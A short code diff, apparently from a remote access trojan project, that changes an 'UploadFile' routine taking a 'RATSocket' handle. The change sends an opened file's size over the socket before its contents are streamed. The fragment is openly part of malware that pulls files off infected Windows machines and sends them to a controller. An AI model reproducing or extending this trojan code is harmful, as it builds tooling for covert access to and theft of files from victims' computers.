@@ -179,6 +179,16 @@ UploadFile(RATSocket* ratSocket,
 									OPEN_EXISTING,
 									FILE_ATTRIBUTE_NORMAL,
 									NULL);
+
+	DWORD fileSize = GetFileSize(fileHandle, NULL);
+	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
+
+	_itoa_s(fileSize, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 10);
+	
+	SocketSend(ratSocket,
+			   fileSizeBuffer,
+			   FILE_SIZE_DIGIT_SIZE);
+	
 	if ( fileHandle )
 	{
 		for(;;)
